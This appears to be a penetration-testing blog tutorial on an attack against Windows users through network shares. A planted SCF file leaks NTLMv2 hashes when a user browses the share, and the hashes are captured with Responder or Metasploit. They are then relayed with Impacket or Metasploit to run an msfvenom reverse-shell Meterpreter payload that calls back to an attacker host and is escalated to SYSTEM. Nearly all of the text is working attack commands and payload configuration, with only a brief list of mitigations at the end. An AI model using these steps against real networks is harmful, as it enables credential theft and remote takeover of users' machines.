## Gathering Hashes

It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.

[Shell]
Command=2
IconFile=\\X.X.X.X\share\filename
[Taskbar]
Command=ToggleDesktop

![SCF File - Contents](https://pentestlab.files.wordpress.com/2017/12/scf-file-contents.png?w=760)

SCF File – Contents

Saving the pentestlab.txt file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the pentestlab.scf on the top of the share drive.

![SCF File](https://pentestlab.files.wordpress.com/2017/12/scf-file.png?w=760)

SCF File

Responder needs to be executed with the following parameters to capture the hashes of the users that will browse the share.

1

`responder -wrf --lm -v -I eth``0`

![Responder - Parameters for SCF](https://pentestlab.files.wordpress.com/2017/12/responder-parameters-for-scf.png?w=760)

Responder – Parameters for SCF

When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key. Responder will capture the NTLMv2 hash.

![Responder - NTLMv2 via SCF](https://pentestlab.files.wordpress.com/2017/12/responder-ntlmv2-via-scf.png?w=760)

Responder – NTLMv2 via SCF

Alternatively to Responder, Metasploit Framework has a module which can be used to capture challenge-response password hashes from SMB clients.

1

`auxiliary/server/capture/smb`

![Metasploit - Capture SMB Module](https://pentestlab.files.wordpress.com/2017/12/metasploit-capture-smb-module.png?w=760)

Metasploit – Capture SMB Module

As previously when the user will browse the same share his password hash will be captured by Metasploit.

![Metasploit - NTLMv2 Captured](https://pentestlab.files.wordpress.com/2017/12/metasploit-ntlmv2-captured.png?w=760)

Metasploit – NTLMv2 Captured

If the password policy inside the company is sufficient it will take possibly days or weeks for the attacker to crack the captured hash.

## Meterpreter Shells

The main advantage of the technique above it that it doesn’t require any user interaction and automatically enforces the user to connect to a share the doesn’t exist negotiating his NTLMv2 hash. Therefore it is also possible to combine this technique with SMB relay that will serve a payload in order to retrieve a Meterpreter shell from every user that will access the share.

MSFVenom can be used to generate the payload that it will executed on the target:

1

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=``192.168``.``1.171` `LPORT=``5555` `-f exe > pentestlab.exe`

![MSFVenom - Payload Generation for SMB Relay](https://pentestlab.files.wordpress.com/2017/12/msfvenom-payload-generation-for-smb-relay.png?w=760)

MSFVenom – Payload Generation for SMB Relay

Coresecurity has released a set of python scripts called [Impacket](https://github.com/CoreSecurity/impacket) that can perform various attacks against Windows protocols such as SMB. Using the **smbrelayx** python script it is possible to set up and SMB server that will serve a payload when the target host will try to connect. This will performed automatically since the SCF file will enforce every to user to connect to a non-existing share with their credentials.

1

`./smbrelayx.py -h Target-IP -e ./pentestlab.exe`

![Impacket - SMB Relay Server](https://pentestlab.files.wordpress.com/2017/12/impacket-smb-relay-server.png?w=760)

Impacket – SMB Relay Server

Metasploit Framework needs to be used as well in order to receive back the connection upon execution of the pentestlab.exe on the target.

1

`exploit/multi/handler`

The module needs to be configured with the same parameters as the generated payload.

1

2

3

4

`set payload windows/meterpreter/reverse_tcp`

`set LHOST` `192.168``.``1.171`

`set LPORT` `5555`

`exploit`

![Metasploit - Multi Handler Module for SMB Relay](https://pentestlab.files.wordpress.com/2017/12/metasploit-multi-handler-module-for-smb-relay.png?w=760)

Metasploit – Multi Handler Module

When the user will browse the share the SMB server will receive the connection and it will use the username and the password hash to authenticate with his system and execute the payload to a writable share.

![Impacket - SMB Relay Attack](https://pentestlab.files.wordpress.com/2017/12/impacket-smb-relay-attack.png?w=760)

Impacket – SMB Relay Attack

A Meterpreter session will received. However in order to avoid losing the connection it is necessary to migrate to a more stable process.

![Meterpreter - List Running Processes](https://pentestlab.files.wordpress.com/2017/12/meterpreter-list-running-processes.png?w=760)

Meterpreter – List Running Processes

The migrate command and the process ID needs to be used.

![Meterpreter - Process Migration](https://pentestlab.files.wordpress.com/2017/12/meterpreter-process-migration.png?w=760)

Meterpreter – Process Migration

In this example the process 1600 corresponds to svchost.exe process which is running with SYSTEM privileges.

![Meterpreter - List of Processes for Migrate](https://pentestlab.files.wordpress.com/2017/12/meterpreter-list-of-processes-for-migrate.png?w=760)

Meterpreter – List of Processes for Migration

Running the **getuid** from a Meterpreter console will obtain the current **UID** which is now SYSTEM.

![Meterpreter - Retrieve Current UID](https://pentestlab.files.wordpress.com/2017/12/meterpreter-retrieve-current-uid.png?w=760)

Meterpreter – Retrieve Current UID

The same attack can be also implemented by Metasploit framework.

1

2

3

4

`exploit/windows/smb/smb_relay`

`set payload windows/meterpreter/reverse_tcp`

`set LHOST` `192.168``.``1.171`

`exploit`

![Metasploit - SMB Relay Module](https://pentestlab.files.wordpress.com/2017/12/metasploit-smb-relay-module.png?w=760)

Metasploit – SMB Relay Module

An SMB server will established which will authenticate with the target by using the username and the password hash, deliver a payload on a writeable share, execute the payload with the rights of the user as a service, perform the clean up and give a Meterpreter session.

![Metasploit - SMB Relay Attack](https://pentestlab.files.wordpress.com/2017/12/metasploit-smb-relay-attack.png?w=760)

Metasploit – SMB Relay Attack

Interaction with the existing sessions can be performed with the **sessions** command.

![Metasploit - SMB Relay Sessions](https://pentestlab.files.wordpress.com/2017/12/metasploit-smb-relay-sessions.png?w=760)

Metasploit – SMB Relay Sessions

## Conclusion

This technique exploits something that is really common in all the networks like shares in order to retrieve password hashes and get meterpreter shells. The only requirement is that the user needs to browse the share that contains the malicious SCF file. However these attacks can be prevented by performing the following:

-   Use of Kerberos Authentication and SMB Signing
-   Disallow write permissions in file shares for unauthenticated users
-   Ensure that NTLMv2 password hash is used instead of LanMan

## References

-   [https://github.com/CoreSecurity/impacket](https://github.com/CoreSecurity/impacket)
-   [https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python](https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python)
-   [https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/](https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/)
-   [http://carnal0wnage.attackresearch.com/2009/04/using-metasploit-smb-sniffer-module.html](http://carnal0wnage.attackresearch.com/2009/04/using-metasploit-smb-sniffer-module.html)
-   [https://room362.com/post/2016/smb-http-auth-capture-via-scf/](https://room362.com/post/2016/smb-http-auth-capture-via-scf/)
-   [https://blog.rapid7.com/2008/11/11/ms08-068-metasploit-and-smb-relay/](https://blog.rapid7.com/2008/11/11/ms08-068-metasploit-and-smb-relay/)
-   [https://cqureacademy.com/blog/penetration-testing/smb-relay-attack](https://cqureacademy.com/blog/penetration-testing/smb-relay-attack)